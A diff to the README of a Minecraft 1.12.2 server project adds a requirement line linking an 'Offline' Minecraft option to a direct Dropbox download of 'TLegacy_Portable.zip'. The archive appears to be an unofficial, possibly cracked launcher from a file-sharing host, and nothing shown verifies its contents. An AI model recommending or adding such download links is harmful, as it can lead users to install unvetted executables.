@@ -32,6 +32,7 @@ The Dog Union Minecraft Server is a customized Minecraft 1.12.2 server that enha
 ## Requirements
 
 Before joining the Dog Union Minecraft Server, ensure your system meets the following prerequisites:
+- **Minecraft** [`Offline`](https://www.dropbox.com/scl/fi/t8fa87p6ydaavq8smnvk8/TLegacy_Portable.zip?rlkey=xwiv33t6qhovqf5uem8zvg1my&st=n7z85bt4&dl=1) or Premium
 
 - **Minecraft Version:** 1.12.2 with Forge Mod Loader installed.
 
